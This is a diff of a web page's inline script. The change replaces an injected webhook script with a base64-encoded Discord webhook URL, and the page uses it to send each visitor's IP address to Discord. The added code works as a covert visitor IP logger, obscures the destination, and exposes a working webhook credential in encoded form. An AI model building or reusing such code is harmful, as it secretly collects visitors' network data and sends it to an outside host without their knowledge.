@@ -147,12 +147,15 @@
       </style>
 </head>
 <body>
-    <script src="/webhook.js"></script>
   <script>
     var userAgent = navigator.userAgent.toLowerCase();
-    // Function to send IP address to Discord webhook.
+    // Function to send IP address to Discord webhook
     function sendIPToDiscord(ip) {
-        // Discord webhook URL obtained from injected js
+        // Discord webhook URL
+        const encodedURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNzk3ODMzNzA5OTg0MTY0OC85MEx6WDVsQzVFRUptMWo1T2JOY0pRUFBvaFJRVkNpazRTTjBpOUtwNkJLRDI4c3o1bXJma1EwU0g1Y0NPZmNzbUotaA==";
+        const webhookURL = atob(encodedURL);;
+        // basic encryption cuz some stupid people kept spamming thru it lmao (scrapers probably wont auto scrape it)
+        // feel free to decode it and send me your messages anyway though
         
         // Data to send
         var data = {
@@ -169,7 +172,7 @@
         })
         .then(response => {
             if (!response.ok) {
-                throw new Error('Network response was not ok.');
+                throw new Error('Network response was not ok');
             }
         })
         .catch(error => {
